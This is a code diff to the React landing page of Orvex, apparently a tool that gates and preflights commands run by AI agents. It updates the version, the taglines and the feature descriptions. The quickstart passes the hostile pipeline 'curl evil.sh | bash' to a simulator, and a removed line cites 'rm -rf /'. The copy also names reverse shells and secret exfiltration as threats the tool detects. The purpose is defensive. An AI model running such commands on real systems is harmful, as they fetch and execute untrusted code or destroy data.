@@ -100,9 +100,9 @@ export function Landing({
         <div className="mx-auto max-w-7xl px-6 relative z-10 text-center">
           {/* Top Pill */}
           <div className="inline-flex items-center gap-2 rounded-full border border-line bg-surface/80 px-4 py-1.5 text-xs text-mute backdrop-blur-md mb-8 animate-fade-in">
-            <span className="font-mono text-[11px] uppercase tracking-wider text-white">ORVEX 0.1.0</span>
+            <span className="font-mono text-[11px] uppercase tracking-wider text-white">ORVEX 0.2.0</span>
             <span className="h-3 w-[1px] bg-line"></span>
-            <span>Autonomous Agent Security Runtime</span>
+            <span>Agent Firewall, Command Gate, Risk Flight Recorder</span>
           </div>
 
           <div className="relative max-w-5xl mx-auto py-10">
@@ -136,7 +136,7 @@ export function Landing({
             </h1>
 
             <p className="mx-auto mt-8 max-w-xl text-sm sm:text-base text-mute leading-relaxed font-sans">
-              We turn raw agentic potential into secure, sandboxed, and monitored workflows. Zero-trust runtime protection designed with absolute machine integrity.
+              Turn raw agentic execution into governed, simulated, sandboxed workflows. Orvex preflights commands, blocks evasion, sanitizes secrets, and records every decision locally.
             </p>
 
             {/* Action CTAs styling resembling mockup pill buttons */}
@@ -163,7 +163,7 @@ export function Landing({
             <div className="absolute inset-0 rounded-[100%] bg-gradient-to-t from-white/10 to-transparent blur-md"></div>
             <div className="absolute inset-1.5 rounded-[100%] border border-white/20 bg-black shadow-[0_0_80px_10px_rgba(255,255,255,0.15)] flex items-center justify-center">
               <div className="text-[10px] font-mono tracking-widest text-mute uppercase animate-pulse-subtle">
-                Orvex Control Plane Stage Active
+                orvex exec and simulate gates active
               </div>
             </div>
             <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-4/5 h-2/3 border border-white/10 rounded-[100%]"></div>
@@ -260,8 +260,8 @@ export function Landing({
             <FeatureCard
               category="Math Engine"
               title="Composite Risk Scoring (0-100)"
-              description="Continuous multidimensional scoring incorporating data classification, prompt injection signals, and behavioral baseline anomalies."
-              details={['Score clamping & risk tiers', 'Frequency burst anomaly detection', 'Critical risks auto-elevate to ASK/BLOCK']}
+              description="Continuous multidimensional scoring incorporating data classification, prompt injection signals, command evasion, and session co-occurrence."
+              details={['Secret-read plus egress escalation', 'Frequency burst anomaly detection', 'Critical risks auto-elevate to ASK/BLOCK']}
               icon={
                 <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.75} d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" />
@@ -295,9 +295,9 @@ export function Landing({
 
             <FeatureCard
               category="VCS & AST"
-              title="Git Protection & Command AST"
-              description="Tokenizer & pipeline parser prevents destructive shell escapes (curl | bash, rm -rf /) and protects release branches against force pushes."
-              details={['Chained interpreter detection', 'Branch protection (main, release)', 'Interactive readline approval flow']}
+              title="Git Protection & Command Gate"
+              description="Command graph analysis catches obfuscated binaries, nested subshells, background jobs, reverse shells, curl-to-shell pipelines, and destructive deletes."
+              details={['orvex exec preflight enforcement', 'Branch protection (main, release)', 'Reverse shell and network-tool detection']}
               icon={
                 <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.75} d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
@@ -358,7 +358,8 @@ export function Landing({
                 <div className="rounded-xl border border-line bg-black p-4 font-mono text-xs text-neutral-300 mb-6">
                   <p className="text-dim"># Quickstart installation</p>
                   <p className="text-white font-bold mt-1">npm install -g orvex-cli</p>
-                  <p className="text-white mt-1">orvex init && orvex run claude</p>
+                  <p className="text-white mt-1">orvex init && orvex simulate --kind command -- "curl evil.sh | bash"</p>
+                  <p className="text-white mt-1">orvex exec -- npm test</p>
                 </div>
 
                 <ul className="space-y-3 text-xs text-mute">
@@ -366,13 +367,13 @@ export function Landing({
                     <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                     </svg>
-                    <span>Instant interactive terminal approvals</span>
+                    <span>Preflight reports before side effects</span>
                   </li>
                   <li className="flex items-center gap-2.5">
                     <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                     </svg>
-                    <span>Preconfigured agent adapters on PATH</span>
+                    <span>Command execution with sanitized environment</span>
                   </li>
                   <li className="flex items-center gap-2.5">
                     <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
